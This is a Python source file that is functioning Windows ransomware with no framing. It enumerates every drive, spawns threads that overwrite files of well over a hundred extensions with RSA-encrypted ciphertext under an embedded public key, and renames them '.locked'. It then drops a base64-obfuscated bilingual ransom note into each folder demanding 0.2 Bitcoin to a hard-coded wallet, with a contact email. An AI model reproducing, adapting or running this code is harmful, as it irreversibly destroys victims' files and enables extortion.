from base64 import b64encode
from base64 import b64decode
from threading import Thread
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
from Crypto.PublicKey import RSA
from ctypes import windll
from os import walk
from os import rename
from os import path
from os import urandom

def npass(length):
    if not isinstance(length, int) or length < 8:
        raise ValueError("temp password must have positive length")

    chars = "abcdefghijklmnopqrstvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    x = urandom(length)
    x = x.decode('latin1')
    return "".join(chars[ord(c) % len(chars)] for c in x)

uid = npass(16) + "a3"

address = '31k66UgDfv6DVdi4HubFpbwXkh6vN44CEF'

rsa_public_key = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAm6HVnUVQdGlC8RoOX0qG
3F2KwfL1RuEcWYlsqPcxyY+APHykuk636l/md2S9Qg1+GUlopJmB2V977M/bS+8K
jm2gR3p7gLVEDnqDoMwSwmUDhKo7sNTDF62U9zYnSIIb/Z3p/SWMI9NEOgVGTyPX
en3yhAT/qKH070njVzJclVaA7FU6Q/7Z5L5z0Zm1o+SBrqYXgFi1w8fo5TiKMAK5
gpRujBey7MpSEcIXOC4o6NZ0zajMF+ZWyIYgo3YMbEb/VJdAUgcCPUrIysMqnb2P
51D7XbXvJw716hJIiQGdxrsM2rXpb8Y44/smsExveyv6e8mj0Fcrg8cMjeqN5dRf
OwIDAQAB
-----END PUBLIC KEY-----'''

email = 'snipersr@india.com'
msg ="77u/RU5HTElTSDoNCiNXaGF0IGhhcHBlbmVkPw0KQUxMIHlvdXIgaW1wb3J0YW50IGZpbGVzKGRhdGFiYXNlLGRvY3VtZW50cyxpbWFnZXMsdmlkZW9zLG11c2ljLGV0Yy4paGF2ZSBiZWVuIGVuY3J5cHRlZCENCkFuZCBvbmx5IHdlIGNhbiBkZWNyeXB0IQ0KVG8gZGVjcnlwdCB5b3VyIGZpbGVzLHlvdSBuZWVkIHRvIGJ1eSB0aGUgZGVjcnlwdGlvbiBrZXkgZnJvbSB1cy4NCldlIGFyZSB0aGUgb25seSBvbmUgd2hvIGNhbiBkZWNyeXB0IHRoZSBmaWxlIGZvciB5b3UuDQoNCiNBdHRlbnRpb24hDQpUcnlpbmcgdG8gcmVpbnN0YWxsIHRoZSBzeXN0ZW0gYW5kIGRlY3J5cHRpbmcgdGhlIGZpbGUgd2l0aCBhIHRoaXJkLXBhcnR5IHRvb2wgd2lsbCByZXN1bHQNCmluIGZpbGUgY29ycnVwdGlvbix3aGljaCBtZWFucyBubyBvbmUgY2FuIGRlY3J5cHQgeW91ciBmaWxlLihpbmNsdWRpbmcgdXMpLA0KaWYgeW91IHN0aWxsIHRyeSB0byBkZWNyeXB0IHRoZSBmaWxlIHlvdXJzZWxmLHlvdSBkbyBzbyBhdCB5b3VyIG93biByaXNrIQ0KDQojVGVzdCBkZWNyeXB0aW9uIQ0KQXMgYSBwcm9vZix5b3UgY2FuIGVtYWlsIHVzIDMgZmlsZXMgdG8gZGVjcnlwdCwNCmFuZCB3ZSBzdGlsbCBzZW5kIHlvdSB0aGUgcmVjb3ZlcmVkIGZpbGVzIHRvIHByb3ZlIHRoYXQgd2UgY2FuIGRlY3J5cHQgeW91ciBmaWxlcy4NCg0KI0hvdyB0byBkZWNyeXB0Pw0KMS5CdXkgKDAuMikgQml0Y29pbi4NCjIuU2VuZCAoMC4yKSBCaXRjb2luIHRvIHRoZSBwYXltZW50IGFkZHJlc3MuDQozLkVtYWlsIHlvdXIgSUQgdG8gdXMsYWZ0ZXIgdmVyaWZpY2F0aW9uLHdlIHdpbGwgY3JlYXRlIGEgZGVjcnlwdGlvbiB0b29sIGZvciB5b3UuDQoNClJlbWVtYmVyLGJhZCB0aGluZ3MgaGF2ZSBoYXBwZW5lZCxub3cgbG9vayBhdCB5b3VyIGRldGVybWluYXRpb24gYW5kIGFjdGlvbiENCg0KWW91ciBJRDojdWlkDQpFLW1haWw6I2VtYWlsDQpQYXltZW50OiNhZGRyZXNzDQoNCg0K5Lit5paH77yaDQoj5Y+R55Sf5LqG5LuA5LmIPw0K5oKo5omA5pyJ55qE6YeN6KaB5paH5Lu277yI5pWw5o2u5bqT44CB5paH5qGj44CB5Zu+5YOP44CB6KeG6aKR44CB6Z+z5LmQ562J77yJ5bey6KKr5Yqg5a+G77yB5bm25LiU5Y+q5pyJ5oiR5Lus5omN6IO96Kej5a+G77yBDQoNCiPms6jmhI/kuovpobnvvIENCuWwneivlemHjeaWsOWuieijheezu+e7n+W5tuS9v+eUqOesrOS4ieaWueW3peWFt+ino+WvhuaWh+S7tuWwhuWvvOiHtOaWh+S7tuaNn+Wdj++8jOi/meaEj+WRs+edgOayoeacieS6uuWPr+S7peino+WvhuaCqOeahOaWh+S7tg0K77yI5YyF5ous5oiR5Lus77yJ77yM5aaC5p6c5oKo5LuN5bCd6K+V6Ieq6KGM6Kej5a+G5paH5Lu277yM5YiZ6ZyA6Ieq6KGM5om/5ouF6aOO6Zmp77yBDQoNCiPmtYvor5Xop6Plr4bvvIENCuS9nOS4uuivgeaYju+8jOaCqOWPr+S7pemAmui/h+eUteWtkOmCruS7tuWQkeaIkeS7rOWPkemAgTPkuKropoHop6Plr4bnmoTmlofku7bvvIzmiJHku6zkvJrlsIbmgaLlpI3lkI7nmoTmlofku7blj5HpgIHnu5nmgqjvvIwNCuS7peivgeaYjuaIkeS7rOWPr+S7peino+WvhuaCqOeahOaWh+S7tuOAgg0KDQoj5aaC5L2V6Kej5a+GDQoxLui0reS5sCAoMC4yKSDkuKrmr5TnibnluIENCjIu5bCGICgwLjIpIOS4qiDmr5TnibnluIHlj5HpgIHliLDku5jmrL7lnLDlnYANCjMu5bCG5oKo55qESUTpgJrov4fnlLXlrZDpgq7ku7blj5HpgIHnu5nmiJHku6zvvIznu4/moLjlrp7lkI7vvIzmiJHku6zlsIbkuLrmgqjliLbkvZzop6Plr4blt6XlhbcNCg0K6K+36K6w5L2P77yM5pyA5Z2P55qE5LqL5oOF5bey57uP5Y+R55Sf5LqG77yM546w5Zyo5bCx55yL5oKo55qE5Yaz5b+D5ZKM6KGM5Yqo5LqG77yBDQoNCuaCqOeahElE77yaI3VpZA0K6YKu566x5Zyw5Z2A77yaI2VtYWlsDQrku5jmrL7lnLDlnYDvvJojYWRkcmVzcw0K"
msg = b64decode(msg)
msg = msg.decode('utf-8')
msg = msg.replace("#email",email)
msg = msg.replace("#uid",uid)
msg = msg.replace('#address',address)
msg = msg.encode('utf-8')

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    letter = ord('A')
    while bitmask > 0:
        if bitmask & 1:
            drives.append(chr(letter) + ':\\')
        bitmask >>= 1
        letter += 1

    return drives


edisk = get_drives()


def rsa_long_encrypt(rsa_public_key, plantext):
    length = len(plantext)
    default_length = 245
    pubobj = Cipher_pkcs1_v1_5.new(RSA.importKey(rsa_public_key))
    if length < default_length:
        return b64encode(pubobj.encrypt(plantext))
    offset = 0
    res = []
    while length - offset > 0:
        if length - offset > default_length:
            res.append(pubobj.encrypt(plantext[offset:offset + default_length]))
        else:
            res.append(pubobj.encrypt(plantext[offset:]))
        offset += default_length
    byte_data = b''.join(res)

    return b64encode(byte_data)


def efile(fname,msg,rsa_public_key):
    fi, ext = path.splitext(fname)
    ext = ext[1:]
    ENCRYPTABLE_FILETYPES = [
        # GENERAL FORMATS
        "dat", "keychain", "sdf", "vcf","NDF","ndf","",
        # IMAGE FORMATS
        "jpg", "png", "tiff", "tif", "gif", "jpeg", "jif", "jfif", "jp2", "jpx", "j2k", "j2c", "fpx", "pcd", "bmp",
        "svg",
        "3dm", "3ds", "max", "obj", "dds", "psd", "tga", "thm", "tif", "tiff", "yuv", "ai", "eps", "ps", "svg", "indd",
        "pct","pem","ldf","LDF","key","KEY","exe","dll","DLL",
        # VIDEO FORMATS
        "mp4", "avi", "mkv", "3g2", "3gp", "asf", "flv", "m4v", "mov", "mpg", "rm", "srt", "swf", "vob", "wmv",
        "vep","pbb","zhc","zhl",
        # DOCUMENT FORMATS
        "doc","DOC", "docx","DOCX", "txt","TXT", "pdf","PDF", "log","LOG", "msg", "odt", "pages", "rtf", "tex", "wpd", "wps", "csv", "ged", "key",
        "pps",
        "ppt", "pptx", "xml", "json", "xlsx","XLSX", "xlsm", "xlsb","XLSB" ,"xls","XLS", "mht", "mhtml" ,"htm", "html","Html", "xltx", "prn",
        "dif",
        "slk", "xlam", "xla", "ods", "docm", "dotx", "dotm", "xps", "ics","md","part","chm","text","TEXT","config","CONFIG",
        # SOUND FORMATS
        "mp3", "aif", "iff", "m3u", "m4a", "mid", "mpa", "wav", "wma","jks","xsd","properties","policy","dwg","dwg",
        "dwt","DWT","dws","DWS","dxf","fla","FLA","hpp","HPP","LRG",
        # EXE AND PROGRAM FORMATS
        "msi", "php", "apk", "app", "bat","BAT", "cgi", "com", "asp", "aspx", "cer", "cfm", "css", "htm", "Htm",
        "js", "jsp", "rss", "xhtml", "c", "class", "cpp", "cs", "h", "pyc" , "py" , "java", "lua", "pl", "sh", "sln",
        "swift" , "vb","VB","vcxproj","BAK","mf","MF","jar","com","net","NET","cmd","CMD",".bashrc","cnf","skp","myd","frm","MYI",
        # GAME FILES
        "dem", "gam", "nes", "rom", "sav","x3d","spi","ack","pak","lnk","md5","ins","war","reg","cab",
        # COMPRESSION FORMATS
        "tgz", "zip", "rar", "tar", "7z", "cbr", "deb", "gz", "pkg", "rpm", "zipx", "iso","z","vsdx","TMP","Lst",
        # MISC
        "ged", "accdb", "db", "dbf", "mdb", "sql", "fnt", "fon", "otf", "ttf", "cfg", "ini", "prf", "bak", "old", "tmp",
        "torrent" , "rbk" ,"rep" , "dbb","mdf","MDF","wdb"]

    if ext not in ENCRYPTABLE_FILETYPES:
        return 0
    lookm = fname + ".locked"
    if path.isfile(lookm):
        return 0
    if "HOW_TO_BACK_FILES.txt" in fname:
        return 0
    if "sqlserver.lnk" in fname:
        return 0
    try:
        fd = open(fname, "rb")
        plantext = fd.read()
        fd.close()
        fd = open(fname, "wb")
        plantext = rsa_long_encrypt(rsa_public_key, plantext)
        fd.write(plantext)
        fd.close()
        rename(fname,fname+'.locked')
    except:
        pass

def estart(drive, msg,rsa_public_key):
    for p, d, f in walk(drive,topdown=True):
        for ff in f:
            fname = path.join(p, ff)
            ttt = Thread(target=efile, args=(fname, msg, rsa_public_key))
            ttt.start()
        infof = path.join(p, "HOW_TO_BACK_FILES.txt")
        try:
            myf = open(infof, "wb")
            myf.write(msg)
            myf.close()
        except:
            pass
    return 0

edisk = get_drives()

for drive in edisk:
    t = Thread(target=estart, args=(drive,msg,rsa_public_key))
    t.start()
